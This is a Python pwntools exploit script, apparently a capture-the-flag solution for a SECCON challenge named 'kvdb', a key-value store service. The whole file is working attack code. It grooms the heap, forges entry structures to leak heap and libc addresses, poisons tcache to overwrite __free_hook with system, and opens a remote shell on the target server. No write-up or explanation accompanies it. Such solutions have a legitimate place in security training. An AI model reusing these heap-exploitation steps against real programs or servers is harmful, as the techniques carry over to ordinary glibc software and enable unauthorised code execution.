#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./kvdb"
LIBCNAME = "./libc.so.6"

hosts = ("kvdb.chal.seccon.jp","localhost","localhost")
ports = (17368,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None

current_size = 0x80
KEYMAX = 0x40
DATAMAX = 0x400
alive = []

## utilities #########################################

def hoge(ix):
  global c
  c.recvuntil("> ")
  c.sendline(str(ix))

def _put(key, size, data):
  global c 
  if len(key) > KEYMAX:
    print("[-] KEY is too long...")
    raw_input("enter to exit...")
    exit(0)
  if len(data) > DATAMAX:
    print("[-] DATA is too long...")
    raw_input("enter to exit...")
    exit(0)
  if len(data) > size:
    print("[-] I will kill you...")
    raw_input("enter to exit...")
    exit(0)
  hoge(1)
  c.recvuntil("Key : ")
  c.sendline(key)
  c.recvuntil("Size : ")
  c.sendline(str(size))
  c.recvuntil("Data : ")
  c.send(data)

  if key not in alive:
    alive.append(key)

def _get(key):
  global c
  hoge(2)
  c.recvuntil("Key : ")
  c.sendline(key)
  if "not found" in c.recvline():
    return None
  c.recvuntil("---- data ----")
  c.recvline()
  return c.recvuntil("---")[:-4]

def _del(key):
  global c 
  hoge(3)
  c.recvuntil("Key : ")
  c.sendline(key)
  if "not found" in c.recvline():
    print("NOT FOUNDDDDDDDDDDDDDDDD")
    raise
  else:
    if key in alive:
      alive.remove(key)
    return True

class entry:
  def __init__(self, key_str, _size, _key=None, _data=None, valid=True):
    self.size = _size
    self.key_str = key_str
    self.key = _key
    self.data = _data
    self.hash = self.new_hash()
    self.valid = valid
  
  def new_hash(self):
    h = 5381
    for c in self.key_str:
      h = h*33 + ord(c)
    print("[ ] hash of " + self.key_str + ": "+hex(h&0xffffffff))
    return h & 0xffffffff

  def gen(self):
    pay = b""
    pay += p32(0x1) if self.valid else p32(0) # valid flag
    pay += p32(self.hash) 
    pay += p64(self.size)
    pay += p64(self.key)  if self.key!=None else p64(0)
    pay += p64(self.data) if self.data!=None else p64(0)
    pay += p64(0) # next
    return pay



## exploit ###########################################

def exploit():
  global c

  _put("A", 0x8-2, "A"*0x1)
  _put("B", 0x8-2, "B"*0x1)
  _put("C", 0x8-2, "C"*0x1)
  _put("D", 0x8-2, "D"*0x1)
  _put("E", 0x8-2, "E"*0x1)
  _put("F", 0x8-2, "F"*0x1)  # inuse 0x30
  _put("G", 0x60-2, "G"*0x4) # inuse 0x90 # cap 0x100

  _put("H", 0x350-2, "H"*0x340) # inuse 0x3e0 # cap 0x400
  _put("A", 0x320, "A"*0x310) # inuse 0x700 # cap 0x800

  _del("A")
  _del("B")
  _del("C")
  _del("D")
  _del("E")
  _del("F")
  _del("G")
  _del("H") # inuse 0x500 # use 0x8 # cap 0x800

  _put("B", 0xf0, "B"*0xe0) # inuse 0x7f0 # use 0x2f0 # cap 0x800
  _del("B")
  _put("C", 0xf0, "C"*0x20) # inuse 0x100 # use 0xf0 # cap 0x400
  _del("C")

  #######################################

  # struct entry's size is 0x28(0x30)
  for i in range(0x1b0//0x30):
    _put(p8(0x61+i), 0x1,p8(0x61+i))
    _del(p8(0x61+i))
 
  _put("?", 0x2e0-2, "?"*0x200) # inuse 0x3ef # cap 0x400
  _del("?")

  _put("!", 0x20-2, "!"*0x10) # YEAH! overlapping! # cap 0x200
  _del("!")

  _put("T", 0x190, "T") # target whose entry is on deleted A
                        # NOTE: old A should be in base+inuse range


  ##############################

  T = entry("T", 0x800, 0xdeadbeef, 0xdeadbeef).gen()
  U = entry("U", 0x800, 0xdeadbeef, 0xdeadbeef).gen()
  V = entry("V", 0x800, 0xdeadbeef, 0xdeadbeef).gen()
  W = entry("W", 0x800, 0xdeadbeef, 0xdeadbeef).gen()
  Z = entry("Z", 0x800, 0xdeadbeef, 0xdeadbeef).gen()

  pay = b""
  pay += "A"*0x3e
  pay += p64(0xdeadc0bebeef)
  pay += T
  pay += p64(0xdeadc0bebeef)
  pay += U
  pay += p64(0xdeadc0bebeef)
  pay += V
  pay += p64(0xdeadc0bebeef)
  pay += W
  pay += p64(0xdeadc0bebeef)
  pay += Z
  _put("A", len(pay), "A"*0x3e + (p64(0x201f1)+p64(0))*((len(pay)-0x3e)//0x10)) # fake top size to avoid corruption

  ############################

  _put("U", 0x1, "U") # it's mine
  _put("V", 0x1, "W") # it's mine
  _put("W", 0x1, "W") # it's mine
  _put("Z", 0x1, "Z") # it's mine

  # now, A's valid flag is 1. So, I can read via OOB. Let's leak heapbase
  leak = unpack(_get("A")[0x86:0x86+8])
  heapbase = leak - 0xdb6
  print("[!] leak: " + hex(leak))
  print("[!] heapbase: " + hex(heapbase))

  #############################
  # let's generate unsorted # inuse 0x1e2 # cap 0x200

  T = entry("T", 0x800, heapbase+0xc24, heapbase+0xc26).gen()
  U = entry("U", 0x800, heapbase+0xdb6, heapbase+0xdb8).gen()
  V = entry("V", 0x800, heapbase+0xdb9, heapbase+0xbe0).gen()
  pay = b""
  pay += "A"*12
  pay += "U\x00"
  pay += "U"
  pay += "V\x00"
  pay += "V"
  pay += "W\x00"
  pay += "W"
  pay += "Z\x00"
  pay += "Z"
  pay += "A"*(0x3e-len(pay))
  pay += p64(0xdeadc0bebeef)
  pay += T
  pay += p64(0xdeadc0bebeef)
  pay += U
  pay += p64(0xdeadc0bebeef)
  pay += V
  _put("A", len(pay), pay)
  _del("A")
  _del("T")
  _del("U")
  _del("V")
  _del("W")
  _del("Z")

  print(alive) # inuse 0x1e2 # cap 0x200
  # generate unsorted
  _put("C", 0x3e0, "C"*0x300) # inuse 0x410 # cap #0x800
  _del("C")
  _put("#", 0x3e0-2, "#"*0x300)
  _del("#") # inuse 0x7f0 # cap 0x800
  _put("M", 0x20-2, "M"*4)
  _del("M") # inuse 0x52 # cap 0x400
  
  _put("N", 0x3a0-2, "N"*0x200)  # unsorted is generated
  _del("N") # inuse 0x3f2
  _put("O", 0x20-2, "O") # cap 0x200, again!

  ###################################

  _put("P", 0x190, "T") # target whose entry is on deleted A
                        # NOTE: old A should be in base+inuse range
  T = entry("T", 0x10, heapbase+0xc24, heapbase+0xc00).gen()
  U = entry("U", 0x800, heapbase+0xdb6, heapbase+0xdb8).gen() # my spy!
  V = entry("V", 0x800, heapbase+0xdb9, heapbase+0xbe0).gen() # my attacker!
  pay = b""
  pay += "A"*12
  pay += "U\x00"
  pay += "U"
  pay += "V\x00"
  pay += "V"
  pay += "W\x00"
  pay += "W"
  pay += "Z\x00"
  pay += "Z"
  pay += "A"*(0x3e-len(pay))
  pay += p64(0xdeadc0bebeef)
  pay += T
  pay += p64(0xdeadc0bebeef)
  pay += U
  _put("A", len(pay), pay)

  leak = unpack(_get("U")[0x1b8:0x1b8+8])
  libcbase = leak - 0x1ebbe0
  print("[!] leak: " + hex(leak))
  print("[!] libcbase: " + hex(libcbase))


  #################################
  # let's tcache poisoning
  _del("A")
  _del("U")
  _del("O")
  _del("P")
      # inuse 0x1e8 # cap 0x200
  print(alive)

  _put("Q", 0x300-2, "Q"*0x10) # inuse 0x349 # cap 0x400
  _del("Q")
  _put("Q", 0x3a0, "Q"*0x10) # remap # inuse 0x3db # cap 0x400 
  _del("Q")
  _put("R", 0x40-2, "R"*0x10) # shrink # inuse 0x8b # cap 0x200
  _del("R")


  # forge chunks
  fake = entry(".", 0x800, heapbase, heapbase, False).gen()
  pay = b""
  pay += b"/bin/sh\x00"
  pay += p8(0) * 0x200
  pay += (p64(0xdeadbeef) +  fake) * 0x9
  pay += p64(0x411)
  pay += p64(libcbase + 0x1eeb28 - 0x60) # free_hook - 0x60
  _put("V", len(pay), pay)

  #################################
  # now, 0x410 [  2]: 0x5617d6890fa0 —▸ 0x7f97123e6b28 (__free_hook) ◂— 0x0
  # inuse 0x8b # cap 0x200
  _put("R", 0x300-2, "R"*0x10)
  _del("R")
  
  # 0x410 [  1]: 0x7fd383c83b28 (__free_hook) ◂— 0x0
  pay = b""
  pay += p8(0)*(8*8-1-0x10)
  pay += p64(libcbase + 0x55410) # system
  pay += p8(0) * (0x310-2-len(pay))
  _put("R", 0x310-2, pay) # free_hook -> system
  _del("R")

  ####################################

  # the pool shoud start with "/bin/sh\x00"
  _put("(", 0x100, "hoge")
  


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
